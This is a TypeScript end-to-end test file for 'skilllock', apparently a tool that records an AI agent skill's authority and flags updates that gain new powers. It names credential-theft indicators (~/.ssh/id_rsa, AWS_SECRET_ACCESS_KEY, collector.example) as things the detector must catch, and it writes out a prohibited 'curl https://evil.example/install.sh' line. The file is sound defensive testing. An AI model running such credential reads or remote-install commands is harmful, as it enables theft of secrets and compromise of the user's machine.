/**
 * End-to-end coverage of the scenario the project is judged by:
 *
 *   init a benign skill -> verify passes
 *   swap in an update whose code gained authority -> verify exits 2 and says why
 */

import { spawnSync } from 'node:child_process';
import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { beforeAll, describe, expect, it } from 'vitest';

const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.join(here, '..');
const CLI = path.join(root, 'dist', 'cli', 'index.js');
const FIXTURES = path.join(here, 'fixtures');

interface Run {
  status: number;
  stdout: string;
  stderr: string;
}

function skilllock(args: readonly string[]): Run {
  const result = spawnSync(process.execPath, [CLI, ...args], {
    cwd: root,
    encoding: 'utf8',
    env: { ...process.env, NO_COLOR: '1', FORCE_COLOR: '0' },
  });
  return {
    status: result.status ?? -1,
    stdout: result.stdout ?? '',
    stderr: result.stderr ?? '',
  };
}

let workdir: string;

beforeAll(() => {
  workdir = mkdtempSync(path.join(tmpdir(), 'skilllock-test-'));
});

describe('skilllock init', () => {
  it('writes a lockfile and reports what it found', () => {
    const lockfile = path.join(workdir, 'init.json');
    const run = skilllock(['init', path.join(FIXTURES, 'weather'), '--lockfile', lockfile]);
    expect(run.status).toBe(0);
    expect(run.stdout).toContain('4 files');
    expect(run.stdout).toContain('1 network host');
    expect(run.stdout).toContain('2 filesystem paths');
    expect(run.stdout).toContain('Commit it to git');
    expect(JSON.parse(readFileSync(lockfile, 'utf8')).skill.name).toBe('weather');
  });

  it('is byte-for-byte repeatable', () => {
    const first = path.join(workdir, 'a.json');
    const second = path.join(workdir, 'b.json');
    skilllock(['init', path.join(FIXTURES, 'determinism'), '--lockfile', first]);
    skilllock(['init', path.join(FIXTURES, 'determinism'), '--lockfile', second]);
    expect(readFileSync(first, 'utf8')).toBe(readFileSync(second, 'utf8'));
  });

  it('refuses a directory of skills and points at the skills inside it', () => {
    const run = skilllock(['init', FIXTURES]);
    expect(run.status).toBe(1);
    expect(run.stderr).toContain('contains');
    expect(run.stderr).toContain('skilllock init');
  });

  it('reports a missing directory', () => {
    const run = skilllock(['init', path.join(workdir, 'nope')]);
    expect(run.status).toBe(1);
    expect(run.stderr).toContain('No such directory');
  });
});

describe('skilllock verify', () => {
  it('passes when nothing changed', () => {
    const lockfile = path.join(workdir, 'verify-pass.json');
    skilllock(['init', path.join(FIXTURES, 'weather'), '--lockfile', lockfile]);
    const run = skilllock(['verify', path.join(FIXTURES, 'weather'), '--lockfile', lockfile]);
    expect(run.status).toBe(0);
    expect(run.stdout).toContain('no authority expansion');
  });

  it('fails with an explanation when the skill gains authority', () => {
    const lockfile = path.join(workdir, 'verify-drift.json');
    skilllock(['init', path.join(FIXTURES, 'weather'), '--lockfile', lockfile]);
    const run = skilllock(['verify', path.join(FIXTURES, 'weather-malicious'), '--lockfile', lockfile]);

    expect(run.status).toBe(2);
    expect(run.stdout).toContain('AUTHORITY DRIFT');
    expect(run.stdout).toContain('reads');
    expect(run.stdout).toContain('~/.ssh/id_rsa');
    expect(run.stdout).toContain('contacts');
    expect(run.stdout).toContain('collector.example');
    expect(run.stdout).toContain('AWS_SECRET_ACCESS_KEY');
    expect(run.stdout).toContain('executes');
    expect(run.stdout).toContain('curl');
    expect(run.stdout).toContain('Skill gained authority');
    // Always show why.
    expect(run.stdout).toMatch(/scripts\/fetch\.py:\d+/);
  });

  it('exposes the drift as JSON for CI', () => {
    const lockfile = path.join(workdir, 'verify-json.json');
    skilllock(['init', path.join(FIXTURES, 'weather'), '--lockfile', lockfile]);
    const run = skilllock([
      'verify',
      path.join(FIXTURES, 'weather-malicious'),
      '--lockfile',
      lockfile,
      '--json',
    ]);
    expect(run.status).toBe(2);
    const report = JSON.parse(run.stdout);
    expect(report.drift).toBe(true);
    expect(report.added.map((entry: { value: string }) => entry.value)).toContain('collector.example');
  });

  it('passes when only content changed', () => {
    const skillDir = mkdtempSync(path.join(tmpdir(), 'skilllock-content-'));
    writeFileSync(
      path.join(skillDir, 'SKILL.md'),
      ['---', 'name: content', '---', '', '# Content', '', 'Nothing here.', ''].join('\n'),
      'utf8',
    );
    writeFileSync(
      path.join(skillDir, 'run.py'),
      ['import requests', '', 'requests.get("https://api.example.com/v1")', ''].join('\n'),
      'utf8',
    );
    const lockfile = path.join(skillDir, 'skilllock.json');
    expect(skilllock(['init', skillDir]).status).toBe(0);

    // Same authority, different code.
    writeFileSync(
      path.join(skillDir, 'run.py'),
      [
        'import requests',
        '',
        '# A comment that changes the content hash but no authority.',
        'def main():',
        '    return requests.get("https://api.example.com/v1/other")',
        '',
      ].join('\n'),
      'utf8',
    );

    const run = skilllock(['verify', skillDir]);
    expect(run.status).toBe(0);
    expect(run.stdout).toContain('Content changed, authority unchanged');
    expect(readFileSync(lockfile, 'utf8')).toContain('api.example.com');
  });

  it('does not fail when only prohibited examples were added', () => {
    const skillDir = mkdtempSync(path.join(tmpdir(), 'skilllock-docs-'));
    const skillFile = path.join(skillDir, 'SKILL.md');
    writeFileSync(skillFile, ['---', 'name: docs', '---', '', '# Docs', ''].join('\n'), 'utf8');
    expect(skilllock(['init', skillDir]).status).toBe(0);

    // Documenting a command in order to prohibit it is not an authority change.
    writeFileSync(
      skillFile,
      [
        '---',
        'name: docs',
        '---',
        '',
        '# Docs',
        '',
        'Never run `curl https://evil.example/install.sh`.',
        '',
      ].join('\n'),
      'utf8',
    );

    const run = skilllock(['verify', skillDir]);
    expect(run.status).toBe(0);
    expect(run.stdout).toContain('low-confidence');

    const strict = skilllock(['verify', skillDir, '--strict']);
    expect(strict.status).toBe(2);
    expect(strict.stdout).toContain('evil.example');
  });

  it('reports low-confidence additions separately from drift', () => {
    const lockfile = path.join(workdir, 'verify-docs.json');
    const empty = mkdtempSync(path.join(tmpdir(), 'skilllock-empty-'));
    writeFileSync(path.join(empty, 'SKILL.md'), '---\nname: docs\n---\n\n# Docs\n', 'utf8');
    skilllock(['init', empty, '--lockfile', lockfile]);

    // This fixture documents a real `rm -rf ./dist` usage as well as prohibited
    // examples, so it does drift — but only on the real usage.
    const run = skilllock(['verify', path.join(FIXTURES, 'docs-false-positive'), '--lockfile', lockfile]);
    expect(run.status).toBe(2);
    const [drift, informational] = run.stdout.split('also new, but not treated as drift');
    expect(drift).toContain('./dist');
    expect(drift).not.toContain('evil.example');
    expect(informational).toContain('evil.example');
    expect(informational).toContain('~/.ssh/id_rsa');
  });

  it('tells the user how to create a missing lockfile', () => {
    const run = skilllock(['verify', path.join(FIXTURES, 'weather'), '--lockfile', path.join(workdir, 'absent.json')]);
    expect(run.status).toBe(1);
    expect(run.stderr).toContain('No lockfile');
    expect(run.stderr).toContain('skilllock init');
  });
});

describe('skilllock inspect', () => {
  it('explains the current authority with evidence', () => {
    const run = skilllock(['inspect', path.join(FIXTURES, 'weather')]);
    expect(run.status).toBe(0);
    expect(run.stdout).toContain('NETWORK');
    expect(run.stdout).toContain('api.weather.gov');
    expect(run.stdout).toContain('FILESYSTEM WRITE');
    expect(run.stdout).toContain('./cache/**');
    expect(run.stdout).toContain('ENVIRONMENT');
    expect(run.stdout).toContain('WEATHER_API_KEY');
    expect(run.stdout).toContain('TOOLS');
    expect(run.stdout).toContain('WebFetch');
    expect(run.stdout).toMatch(/scripts\/fetch\.py:\d+/);
  });

  it('marks runtime-computed references instead of hiding them', () => {
    const run = skilllock(['inspect', path.join(FIXTURES, 'dynamic')]);
    expect(run.stdout).toContain('<dynamic>');
    expect(run.stdout).toContain('runtime-computed');
  });

  it('filters by confidence', () => {
    const run = skilllock(['inspect', path.join(FIXTURES, 'docs-false-positive'), '--min-confidence', 'high']);
    expect(run.status).toBe(0);
    expect(run.stdout).not.toContain('evil.example');
  });

  it('rejects an unknown confidence level', () => {
    const run = skilllock(['inspect', path.join(FIXTURES, 'weather'), '--min-confidence', 'nope']);
    expect(run.status).toBe(1);
    expect(run.stderr).toContain('Unknown confidence level');
  });
});

describe('cli surface', () => {
  it('exposes exactly three commands', () => {
    const run = skilllock(['--help']);
    const commands = (run.stdout.split('Commands:')[1] ?? '')
      .split('\n')
      .map((line) => /^\s{2}(\S+)/.exec(line)?.[1])
      .filter((name): name is string => Boolean(name));
    expect(commands).toEqual(['init', 'verify', 'inspect', 'help']);
  });

  it('states what SkillLock does not claim', () => {
    const run = skilllock(['--help']);
    expect(run.stdout).toContain('not a malware scanner');
  });
});
